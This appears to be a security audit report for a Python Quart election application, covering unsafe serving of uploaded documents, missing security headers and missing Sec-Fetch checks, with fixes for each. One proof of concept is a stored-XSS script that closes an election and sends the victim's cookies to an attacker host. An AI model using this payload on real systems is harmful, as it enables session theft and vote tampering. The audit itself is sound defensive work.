## Findings

### HIGH Severity

#### Finding ASVS-321-SEV-001: User-Uploaded Documents Served Without Content Interpretation Controls

**Severity:** HIGH  
**Gap Type:** Type A — Entry point with NO control  
**File:** `v3/server/pages.py`  
**Function:** `serve_doc` (lines 593–608)  
**ASVS Requirement:** 3.2.1 — "when...a user-uploaded file...is requested directly"

**Related Functions Checked:**
- `rewrite_description()` (lines 28-35) — generates links to uploaded documents
- `send_from_directory()` — Quart framework function

**Description:**

The `serve_doc` endpoint serves user-uploaded documents directly to the browser without any content interpretation controls. Files are served with inferred MIME types and no `Content-Disposition: attachment` header, `Content-Security-Policy: sandbox` directive, or `X-Content-Type-Options: nosniff` protection. This allows malicious HTML/SVG files to execute JavaScript in the application's origin.

**Vulnerable Code:**

```python
# Serve supporting documents for an issue
@APP.get('/docs/<iid>/<docname>')
@asfquart.auth.require  # fine-grained per-doc authz within the handler
async def serve_doc(iid, docname):
    result = await basic_info()  # get PID  ### grr: called uid

    db = steve.election.Election.open_database(DB_FNAME)
    row = db.q_get_mayvote.first_row(result.uid, iid)
    if not row:
        # Nothing fancy. Just pretend the file does not exist
        quart.abort(404)
        # NOTREACHED

    ### verify the propriety of DOCNAME.

    # Return per-issue document.
    return await quart.send_from_directory(DOCSDIR / iid, docname)
```

**Data Flow:**

```
User uploads file (e.g., malicious.html) → stored in DOCSDIR/<iid>/
↓
Browser requests GET /docs/<iid>/malicious.html
↓
serve_doc() calls send_from_directory() with no Content-Disposition or CSP
↓
Quart serves file with Content-Type inferred from extension (text/html)
↓
Browser renders HTML in application origin → JavaScript executes (XSS)
```

**Proof of Concept:**

1. An election administrator uploads `exploit.html` as a document for issue `ISSUE-123`:
```html
<!-- exploit.html -->
<script>
  // Executes in the application's origin
  fetch('/do-close/TARGET-ELECTION-EID')
    .then(() => document.location = 'https://attacker.com/stolen?cookies=' + document.cookie);
</script>
```

2. An eligible voter visits `https://app.example.org/docs/ISSUE-123/exploit.html` (linked from the issue description via the `doc:exploit.html` pattern).

3. The HTML renders in the browser within the application's origin. JavaScript executes with full access to the user's session, enabling session hijacking, CSRF against state-changing GET endpoints (`/do-open/`, `/do-close/`), or data exfiltration.

**Impact:**
- Stored XSS via uploaded documents executing in the application's origin
- Session theft, vote manipulation, or election state changes by any authenticated user who views the document
- Bypasses authentication since the victim is already logged in

**Remediation:**

```python
@APP.get('/docs/<iid>/<docname>')
@asfquart.auth.require
async def serve_doc(iid, docname):
    result = await basic_info()

    db = steve.election.Election.open_database(DB_FNAME)
    row = db.q_get_mayvote.first_row(result.uid, iid)
    if not row:
        quart.abort(404)

    # Validate docname to prevent path traversal
    if '..' in docname or '/' in docname or '\\' in docname:
        quart.abort(400)

    # Serve as attachment to prevent browser rendering
    response = await quart.send_from_directory(
        DOCSDIR / iid,
        docname,
        as_attachment=True  # Sets Content-Disposition: attachment
    )
    # Add CSP sandbox as defense-in-depth
    response.headers['Content-Security-Policy'] = "sandbox"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

### MEDIUM Severity

#### Finding ASVS-321-SEV-002: Missing Global Security Headers Framework

**Severity:** MEDIUM  
**Gap Type:** Type A — No control exists at all  
**File:** `v3/server/main.py`  
**Function:** `create_app` (lines 30–43)  
**ASVS Requirement:** 3.2.1 — "security controls are in place to prevent browsers from rendering content...in an incorrect context"

**Related Functions Checked:**
- `asfquart.construct()` — framework initialization
- All response handlers in `pages.py` — no header middleware present

**Description:**

The application has no `after_request` handler or middleware to apply security response headers globally. All 21 endpoints in the application serve responses without `Content-Security-Policy`, `X-Content-Type-Options`, or other defensive headers. This creates no defense-in-depth layer and allows browsers to MIME-sniff responses.

**Vulnerable Code:**

```python
def create_app():
    "Create the asfquart app and its endpoints."

    ### is this really needed right now?
    # Avoid OIDC
    import asfquart.generics

    asfquart.generics.OAUTH_URL_INIT = (
        'https://oauth.apache.org/auth?state=%s&redirect_uri=%s'
    )
    asfquart.generics.OAUTH_URL_CALLBACK = 'https://oauth.apache.org/token?code=%s'

    app = asfquart.construct('steve', app_dir=THIS_DIR, static_folder=None)

    # Now that we have an APP, import modules that will add page
    # and API endpoints into the APP.
    import pages  # noqa: F401
    import api  # noqa: F401

    return app  # also available as asfquart.APP now
```

**Proof of Concept:**

Any response from the application (e.g., `GET /about`) will lack:
```
Content-Security-Policy: ...
X-Content-Type-Options: nosniff
```

This allows MIME-sniffing attacks and provides no defense-in-depth if any endpoint inadvertently returns user-controlled content.

**Impact:**
- Browsers may MIME-sniff API responses or other resources and render them as HTML
- No defense-in-depth layer to contain rendering of injected content
- Amplifies the severity of Finding ASVS-321-SEV-001 and any future content-serving endpoints

**Remediation:**

```python
def create_app():
    app = asfquart.construct('steve', app_dir=THIS_DIR, static_folder=None)

    @app.after_request
    async def set_security_headers(response):
        # Prevent MIME sniffing
        response.headers['X-Content-Type-Options'] = 'nosniff'
        # Default CSP: restrict content sources
        if 'Content-Security-Policy' not in response.headers:
            response.headers['Content-Security-Policy'] = (
                "default-src 'self'; "
                "script-src 'self'; "
                "style-src 'self' 'unsafe-inline'; "
                "img-src 'self' data:; "
                "frame-ancestors 'none'"
            )
        return response

    import pages
    import api

    return app
```

#### Finding ASVS-321-SEV-003: API Endpoints Lack Sec-Fetch-* Context Validation

**Severity:** MEDIUM  
**Gap Type:** Type A — No control exists at all  
**File:** `v3/server/pages.py`  
**Functions:** `do_set_open_at_endpoint` (line 376), `do_set_close_at_endpoint` (line 383), `do_vote_endpoint` (line 390)  
**ASVS Requirement:** 3.2.1 — "when an API...is requested directly"

**Related Functions Checked:**
- `_set_election_date()` — called by date-setting endpoints
- `do_vote_endpoint()` — vote submission handler
- All POST endpoints returning `('', 204)` responses

**Description:**

API-style endpoints that accept JSON or form data and return non-HTML responses do not validate `Sec-Fetch-Dest` or `Sec-Fetch-Mode` headers to confirm the request originates from the expected context (e.g., `fetch` from JavaScript, not direct browser navigation). While POST mitigates direct navigation, there is no server-side enforcement that these endpoints are called only via the intended AJAX/fetch context.

**Vulnerable Code (representative):**

```python
@APP.post('/do-set-open_at/<eid>')
@asfquart.auth.require({R.committer})
@load_election
async def do_set_open_at_endpoint(election):
    return await _set_election_date(election, 'open_at')
```

Which returns:
```python
    return '', 204
```

**Impact:**
- Without `Sec-Fetch-*` validation, there is no server-side assurance that API endpoints are accessed only from the application's frontend
- Combined with the lack of CSRF tokens (acknowledged technical debt), this increases the risk that these endpoints could be triggered from external contexts

**Remediation:**

```python
def require_fetch_context(func):
    """Middleware to validate Sec-Fetch-* headers on API endpoints."""
    @functools.wraps(func)
    async def wrapper(*args, **kwargs):
        sec_fetch_dest = quart.request.headers.get('Sec-Fetch-Dest', '')
        sec_fetch_mode = quart.request.headers.get('Sec-Fetch-Mode', '')
        # API endpoints should only be called via fetch/XHR
        if sec_fetch_dest not in ('empty', '') or sec_fetch_mode not in ('cors', 'same-origin', 'no-cors', ''):
            quart.abort(403, 'Invalid request context')
        return await func(*args, **kwargs)
    return wrapper

@APP.post('/do-set-open_at/<eid>')
@asfquart.auth.require({R.committer})
@require_fetch_context
@load_election
async def do_set_open_at_endpoint(election):
    return await _set_election_date(election, 'open_at')
```

## Architecture Observations

1. **No security headers framework**: The application has no centralized mechanism for applying security response headers. Neither `main.py` nor `pages.py` implements an `after_request` handler or middleware for headers like CSP, X-Content-Type-Options, or X-Frame-Options.

2. **User-uploaded file serving is a first-class feature**: The `rewrite_description()` function (line 28-35) actively generates links to user-uploaded documents via the `doc:filename` pattern, and `serve_doc()` serves them. This is a designed feature path that makes Finding ASVS-321-SEV-001 particularly impactful.

3. **Mixed API/page architecture**: Some endpoints return HTML (via templates), others return API-style responses (`'', 204`), and others serve files. There is no differentiation in security headers or content-type enforcement between these response types.

4. **Developer awareness of gaps**: The comment `### verify the propriety of DOCNAME.` (line 605) indicates the developer recognized the need for validation but did not implement it, creating a documented-but-unresolved gap.
